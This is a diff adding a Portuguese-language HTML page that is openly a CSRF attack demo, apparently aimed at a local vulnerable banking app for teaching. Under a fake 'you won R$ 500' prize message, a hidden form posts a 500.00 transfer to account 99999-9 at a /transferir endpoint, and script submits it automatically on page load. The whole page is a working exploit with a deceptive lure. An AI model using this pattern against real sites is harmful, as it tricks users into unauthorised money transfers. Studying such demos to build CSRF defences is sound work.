@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Voce ganhou um premio!</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
+            background: #f0f0f0;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 10px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        h1 { color: #27ae60; }
+        .loader {
+            border: 8px solid #f3f3f3;
+            border-top: 8px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Parabens! Voce ganhou R$ 500,00!</h1>
+        <p>Processando seu premio... Aguarde!</p>
+        <div class="loader"></div>
+    </div>
+
+    <!-- FORMULARIO OCULTO - ATAQUE CSRF -->
+    <!-- Este formulario vai enviar uma requisicao para o servidor vulneravel -->
+    <form action="http://localhost:3000/transferir" method="POST" id="ataque">
+        <input type="hidden" name="conta_destino" value="99999-9">
+        <input type="hidden" name="valor" value="500.00">
+    </form>
+
+    <script>
+        // Submete o formulario automaticamente quando a pagina carrega
+        document.getElementById('ataque').submit();
+    </script>
+</body>
+</html>
